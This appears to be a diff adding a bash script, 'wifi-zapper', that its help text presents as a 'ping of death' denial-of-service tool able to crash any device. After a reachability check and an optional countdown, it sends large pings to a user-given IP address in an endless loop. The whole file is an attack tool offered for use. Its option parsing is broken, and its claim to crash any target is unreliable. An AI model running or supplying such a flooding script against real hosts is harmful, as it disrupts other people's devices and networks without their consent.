@@ -1,0 +1,89 @@
+#!/bin/bash
+
+
+echo ""
+echo "Running command: "$0 $1 $2 $3
+ping=1
+echo ""
+count=$3
+if [[ $1 -eq 0 ]] && [[ $1 != "-h" ]]
+then
+	echo ""
+        echo "Type in the command below so you dont have to type bash before everything."
+        echo "alias wifi-zapper='bash wifi-zapper'"
+        echo ""
+        echo "Usage: wifi-zapper <target> (options)"
+        echo ""
+        echo ""
+        echo "I need you to do me a favor. Include a target pa pa pa please."
+        echo "Syntax: (bash) wifi-zapper <target> <Amount of rounds> (options)"
+        echo "Type: (bash) wifi-zapper -h"
+	echo "For help"
+	echo ""
+        exit
+fi
+if [[ $1 -eq "-h" ]] && [[ $1 != "-a" ]]
+then
+	echo ""
+	echo "HELP PAGE."
+	echo ""
+	echo "Thank you for using wifi-zapper!"
+	echo "Wifi Zapper is a tool that performs a ping of death DoS attack on any device. Crashing the target."
+	echo ""
+	echo "Yes. This has got to be the most simple help page you have ever seen."
+	echo ""
+	echo "Name                  Description                      Usage"
+	echo "-c                    Counts down before attack        (bash) wifi-zapper <target-ip> -c <Number to count down from>"
+	echo "-h                    Prints this help page            (bash) wifi-zapper -h"
+	echo ""
+	echo ""
+	echo "Examples:"
+	echo "(bash) wifi-zapper 192.168.0.1"
+	echo "(bash) wifi-zapper -h"
+	echo "(bash) wifi-zapper 192.168.0.1 -c 10"
+	echo ""
+	echo "And thats all!"
+	echo ""
+	exit
+fi
+ping $1 -c 3 -W 10 > bool
+if [[ $? != 0 ]]
+then
+	echo ""
+	echo "Sorry. I cant seem to find the target you are looking for!"
+	echo "Check for any typos."
+	echo ""
+	echo '  \'
+	echo '   \'
+	echo '   |   ='
+	echo '   |'
+	echo '   |   ='
+	echo '  /'
+	echo ' /'
+	echo ''
+	exit
+fi
+echo "Are you ready for the ping of death!"
+echo ""
+if [[ $2 -eq "-c" ]] && [[ $count > 0 ]]
+then
+	while [[ $count != 0 ]]
+	do
+		echo "Pinging in:"
+		echo $count
+		sleep 1s
+		count=$(($count-1))
+	done
+fi
+echo ""
+echo "Here we go! To stop attack spam ctrl+c"
+echo ""
+sleep 1s
+while [[ 1 -eq 1 ]]; do
+	ping $1 -l 65500 -W 1 -c 1 > DeleteMe.txt
+	echo "Sending out ping probes"
+	echo "Total amount of pings: $ping"
+	echo ""
+	ping=$(expr $ping + 1)
+done
+
